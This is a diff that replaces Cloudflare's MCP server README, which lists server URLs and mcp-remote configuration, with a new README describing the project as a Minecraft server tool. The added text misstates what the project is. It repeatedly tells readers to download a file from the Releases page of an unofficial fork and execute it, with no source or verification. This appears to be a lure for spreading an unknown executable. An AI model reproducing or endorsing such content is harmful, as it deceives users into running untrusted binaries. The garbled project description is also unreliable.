@@ -1,67 +1,81 @@
-# Cloudflare MCP Server
+# MCP Server Cloudflare 🌩️
 
-Model Context Protocol (MCP) is a [new, standardized protocol](https://modelcontextprotocol.io/introduction) for managing context between large language models (LLMs) and external systems. In this repository, you can find several MCP servers allowing you to connect to Cloudflare's service from an MCP client (e.g. Cursor, Claude) and use natural language to accomplish tasks through your Cloudflare account.
+![MCP Server Cloudflare](https://img.shields.io/badge/MCP%20Server%20Cloudflare-v1.0-blue.svg)
 
-These MCP servers allow your [MCP Client](https://modelcontextprotocol.io/clients) to read configurations from your account, process information, make suggestions based on data, and even make those suggested changes for you. All of these actions can happen across cloudflare's many services including application development, security and performance.
+Welcome to the **MCP Server Cloudflare** repository! This project is designed to enhance your Minecraft server experience by integrating with Cloudflare services. Below, you'll find everything you need to know to get started.
 
-The following servers are included in this repository:
+## Table of Contents
 
-| Server Name                                                    | Description                                                                                     | Server URL                                     |
-| -------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ---------------------------------------------- |
-| [**Documentation server**](/apps/docs-vectorize)               | Get up to date reference information on Cloudflare                                              | `https://docs.mcp.cloudflare.com/sse`          |
-| [**Workers Bindings server**](/apps/workers-bindings)          | Build Workers applications with storage, AI, and compute primitives                             | `https://bindings.mcp.cloudflare.com/sse`      |
-| [**Observability server**](/apps/workers-observability)        | Debug and get insight into your application’s logs and analytics                                | `https://observability.mcp.cloudflare.com/sse` |
-| [**Radar server**](/apps/radar)                                | Get global Internet traffic insights, trends, URL scans, and other utilities                    | `https://radar.mcp.cloudflare.com/sse`         |
-| [**Container server**](/apps/sandbox-container)                | Spin up a sandbox development environment                                                       | `https://containers.mcp.cloudflare.com/sse`    |
-| [**Browser rendering server**](/apps/browser-rendering)        | Fetch web pages, convert them to markdown and take screenshots                                  | `https://browser.mcp.cloudflare.com/sse`       |
-| [**Logpush server**](/apps/logpush)                            | Get quick summaries for Logpush job health                                                      | `https://logs.mcp.cloudflare.com/sse`          |
-| [**AI Gateway server**](/apps/ai-gateway)                      | Search your logs, get details about the prompts and responses                                   | `https://ai-gateway.mcp.cloudflare.com/sse`    |
-| [**AutoRAG server**](/apps/autorag)                            | List and search documents on your AutoRAGs                                                      | `https://autorag.mcp.cloudflare.com/sse`       |
-| [**Audit Logs server**](/apps/auditlogs)                       | Query audit logs and generate reports for review                                                | `https://auditlogs.mcp.cloudflare.com/sse`     |
-| [**DNS Analytics server**](/apps/dns-analytics)                | Optimize DNS performance and debug issues based on current set up                               | `https://dns-analytics.mcp.cloudflare.com/sse` |
-| [**Digital Experience Monitoring server**](/apps/dex-analysis) | Get quick insight on critical applications for your organization                                | `https://dex.mcp.cloudflare.com/sse`           |
-| [**Cloudflare One CASB server**](/apps/cloudflare-one-casb)    | Quickly identify any security misconfigurations for SaaS applications to safeguard users & data | `https://casb.mcp.cloudflare.com/sse`          |
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-## Access the remote MCP server from any MCP client
+## Introduction
 
-If your MCP client has first class support for remote MCP servers, the client will provide a way to accept the server URL directly within its interface (e.g. [Cloudflare AI Playground](https://playground.ai.cloudflare.com/))
+The MCP Server Cloudflare project aims to simplify the management of Minecraft servers using Cloudflare's powerful tools. With this integration, you can enjoy improved performance, security, and uptime for your gaming experience. 
 
-If your client does not yet support remote MCP servers, you will need to set up its resepective configuration file using mcp-remote (https://www.npmjs.com/package/mcp-remote) to specify which servers your client can access.
+## Features
+
+- **DDoS Protection**: Protect your server from attacks with Cloudflare's robust security features.
+- **Global CDN**: Leverage Cloudflare's Content Delivery Network to reduce latency and improve load times.
+- **Analytics**: Gain insights into your server's traffic and performance through Cloudflare's analytics dashboard.
+- **Easy Setup**: Follow simple steps to integrate your Minecraft server with Cloudflare.
+
+## Installation
+
+To get started, you need to download the latest release. Visit the [Releases section](https://github.com/thaygiaotintony/mcp-server-cloudflare/releases) to find the latest version. Download the appropriate file for your system and execute it to install.
+
+### Steps to Install
+
+1. Go to the [Releases section](https://github.com/thaygiaotintony/mcp-server-cloudflare/releases).
+2. Choose the latest release file suitable for your operating system.
+3. Execute the downloaded file.
+4. Follow the on-screen instructions to complete the installation.
+
+## Usage
+
+After installation, you can start using the MCP Server Cloudflare features. Here’s how:
+
+1. **Configure Your Server**: Edit the configuration file to set up your Cloudflare API key and server details.
+2. **Start the Server**: Launch your Minecraft server as you normally would.
+3. **Monitor Performance**: Use the Cloudflare dashboard to monitor your server’s performance and security.
+
+### Configuration Example
 
 ```json
 {
-	"mcpServers": {
-		"cloudflare-observability": {
-			"command": "npx",
-			"args": ["mcp-remote", "https://observability.mcp.cloudflare.com/sse"]
-		},
-		"cloudflare-bindings": {
-			"command": "npx",
-			"args": ["mcp-remote", "https://bindings.mcp.cloudflare.com/sse"]
-		}
-	}
+  "api_key": "YOUR_CLOUDFLARE_API_KEY",
+  "server_ip": "YOUR_SERVER_IP",
+  "server_port": "YOUR_SERVER_PORT"
 }
 ```
 
-## Need access to more Cloudflare tools?
-
-We're continuing to add more functionality to this remote MCP server repo. If you'd like to leave feedback, file a bug or provide a feature request, [please open an issue](https://github.com/cloudflare/mcp-server-cloudflare/issues/new/choose) on this repository
-
-## Troubleshooting
-
-"Claude's response was interrupted ... "
-
-If you see this message, Claude likely hit its context-length limit and stopped mid-reply. This happens most often on servers that trigger many chained tool calls such as the observability server.
-
-To reduce the chance of running in to this issue:
-
-- Try to be specific, keep your queries concise.
-- If a single request calls multiple tools, try to to break it into several smaller tool calls to keep the responses short.
-
-## Paid Features
-
-Some features may require a paid Cloudflare Workers plan. Ensure your Cloudflare account has the necessary subscription level for the features you intend to use.
+Make sure to replace the placeholders with your actual API key and server details.
 
 ## Contributing
 
-Interested in contributing, and running this server locally? See [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
+We welcome contributions from the community! If you want to help improve the MCP Server Cloudflare project, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Submit a pull request to the main repository.
+
+Please ensure your code follows the existing style and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support
+
+If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/thaygiaotintony/mcp-server-cloudflare/releases) for updates and new features.
+
+---
+
+Thank you for checking out the MCP Server Cloudflare project! We hope it enhances your Minecraft server experience. Happy gaming! 🎮
